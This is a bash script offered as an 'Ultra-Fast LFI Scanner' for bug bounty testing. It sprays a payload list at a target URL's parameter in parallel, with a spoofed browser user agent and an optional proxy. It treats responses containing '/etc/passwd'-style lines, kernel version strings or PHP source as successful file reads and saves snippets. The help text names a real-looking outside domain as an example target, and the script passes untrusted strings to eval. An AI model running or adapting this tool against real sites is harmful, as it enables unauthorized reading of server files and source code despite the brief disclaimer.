#!/bin/bash
# Ultra-Fast LFI Scanner for Bug Bounty Testing (Hacker UI Edition)
# Author: FIRE-HACKER
# DISCLAIMER: Use this tool only for authorized security testing.

# Clear screen on startup
clear

# Color definitions
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
RESET="\e[0m"

# Default values
PAYLOAD_FILE="lfi.txt"
THREADS=$(nproc --all)  # Auto-detect CPU cores
TOTAL_PAYLOADS=0
PROXY=""
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36"
EXIT_ON_FOUND=false

# Files for logging and counter
COUNTER_FILE=".lfih_counter.tmp"
FOUND_FILE="found.txt"

# Cleanup files on exit
cleanup() {
    rm -f "$COUNTER_FILE" "$COUNTER_FILE.lock"
}
trap cleanup EXIT

# Check required tools
for cmd in curl parallel; do
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${RED}Error: $cmd is not installed. Install it and try again.${RESET}"
        exit 1
    fi
done

# Fancy Banner Function
banner() {
    echo -e "${CYAN}=============================================================="
    echo -e "    ██▓      █████▒██▓ ██░ ██       LFIH - Local File Inclusion"
    echo -e "   ▓██▒    ▓██   ▒▓██▒▓██░ ██▒      Bug Bounty Edition"
    echo -e "   ▒██░    ▒████ ░▒██▒▒██▀▀██░      Coded by FIRE-HACKER"
    echo -e "   ▒██░    ░▓█▒  ░░██░░▓█ ░██       "
    echo -e "   ░██████▒░▒█░   ░██░░▓█▒░██▓      HACK THE PLANET!"
    echo -e "   ░ ▒░▓  ░ ▒ ░   ░▓   ▒ ░░▒░▒"
    echo -e "   ░ ░ ▒  ░ ░      ▒ ░ ▒ ░▒░ ░"
    echo -e "     ░ ░    ░ ░    ▒ ░ ░  ░░ ░"
    echo -e "       ░  ░        ░   ░  ░  ░"
    echo -e "==============================================================${RESET}"
}

# Help menu
help_menu() {
    banner
    echo -e "${GREEN}Usage:${RESET} $0 -u <URL> [-p <payload_file>] [-t <threads>] [-x <proxy>] [-A <user_agent>] [-e]"
    echo
    echo -e "${YELLOW}Options:${RESET}"
    echo "  -u <URL>         Target URL (e.g., \"http://target.com/index.php?page=\")"
    echo "  -p <file>        Payload file (default: lfi.txt)"
    echo "  -t <threads>     Number of parallel requests (default: auto-detect CPU cores)"
    echo "  -x <proxy>       Proxy to use (e.g., http://127.0.0.1:8080)"
    echo "  -A <user_agent>  Custom User-Agent string (default is a Chrome UA)"
    echo "  -e               Exit immediately upon finding a vulnerability"
    echo "  -h               Show this help menu"
    echo
    echo -e "${GREEN}Example:${RESET}"
    echo "  $0 -u \"http://lars-seeberg.com/index.php?page=\""
    echo "  $0 -u \"http://target.com/index.php?page=\" -p custom_payloads.txt -t 100 -x http://127.0.0.1:8080 -A \"CustomUA/1.0\" -e"
    exit 0
}

# Parse command-line arguments
while getopts "u:p:t:x:A:eh" opt; do
    case "$opt" in
        u) url=$OPTARG ;;
        p) PAYLOAD_FILE=$OPTARG ;;
        t) THREADS=$OPTARG ;;
        x) PROXY=$OPTARG ;;
        A) USER_AGENT=$OPTARG ;;
        e) EXIT_ON_FOUND=true ;;
        h) help_menu ;;
        *) help_menu ;;
    esac
done

# Ensure URL is provided
if [[ -z "$url" ]]; then
    echo -e "${RED}Error: URL is required!${RESET}"
    help_menu
fi

# Ensure payload file exists
if [[ ! -f "$PAYLOAD_FILE" ]]; then
    echo -e "${RED}Error: Payload file '$PAYLOAD_FILE' not found!${RESET}"
    exit 1
fi

# Count total payloads
TOTAL_PAYLOADS=$(wc -l < "$PAYLOAD_FILE")

# Clear found vulnerabilities file
> "$FOUND_FILE"

banner
echo -e "${GREEN}[+] Target:${RESET} $url"
echo -e "${GREEN}[+] Loaded Payloads:${RESET} $TOTAL_PAYLOADS"
echo -e "${GREEN}[+] Running with ${THREADS} parallel requests...${RESET}"
[ -n "$PROXY" ] && echo -e "${GREEN}[+] Proxy:${RESET} $PROXY"
echo ""

# Initialize counter file and start timer
echo 0 > "$COUNTER_FILE"
START_TIME=$(date +%s)
export START_TIME

# Function to test a single payload
test_lfi() {
    local payload=$1
    local full_url="${url}${payload}"
    
    # Build curl options dynamically
    local curl_opts="--silent --max-time 3"
    [ -n "$PROXY" ] && curl_opts+=" --proxy $PROXY"
    [ -n "$USER_AGENT" ] && curl_opts+=" -A \"$USER_AGENT\""
    
    # Execute curl (using eval to correctly interpret quotes)
    response=$(eval curl $curl_opts "\"$full_url\"")
    
    # Atomically increment the counter using flock and capture new value
    local new_count
    new_count=$( ( 
         flock -x 200 || exit 1
         local current
         current=$(cat "$COUNTER_FILE")
         new_count=$((current + 1))
         echo "$new_count" > "$COUNTER_FILE"
         echo "$new_count"
         ) 200>"$COUNTER_FILE.lock" )
    
    # Calculate elapsed time
    local now elapsed elapsed_formatted percent
    now=$(date +%s)
    elapsed=$(( now - START_TIME ))
    elapsed_formatted=$(printf "%02d:%02d:%02d" $((elapsed/3600)) $(((elapsed%3600)/60)) $((elapsed%60)))
    percent=$(( new_count * 100 / TOTAL_PAYLOADS ))
    
    # Display one-line real-time counter with timer and percentage progress
    echo -ne "${YELLOW}\r[+] Tested: ${new_count}/${TOTAL_PAYLOADS} (${percent}%) - Time: ${elapsed_formatted}${RESET}"
    
    # Check for common LFI indicators
    if [[ "$response" =~ "root:x:0:0" || "$response" =~ "Linux version" || "$response" =~ "<?php" ]]; then
        echo -e "\n${GREEN}[!] Potential LFI Found!${RESET}"
        echo -e "[+] Payload: $payload"
        # Log the finding (the response snippet is still saved in the log file)
        local snippet
        snippet=$(echo "$response" | head -n 10)
        {
          echo "Payload: $payload"
          echo "Response Snippet:"
          echo "$snippet"
          echo "----------------------------------------"
        } >> "$FOUND_FILE"
        if $EXIT_ON_FOUND; then
            exit 0
        fi
    fi
}

export -f test_lfi
export url PROXY USER_AGENT COUNTER_FILE TOTAL_PAYLOADS FOUND_FILE START_TIME

# Run payloads in parallel using GNU Parallel
cat "$PAYLOAD_FILE" | parallel -j "$THREADS" test_lfi {}

echo -e "\n${RED}[-] Scanning complete. Check '$FOUND_FILE' for results.${RESET}"
exit 0
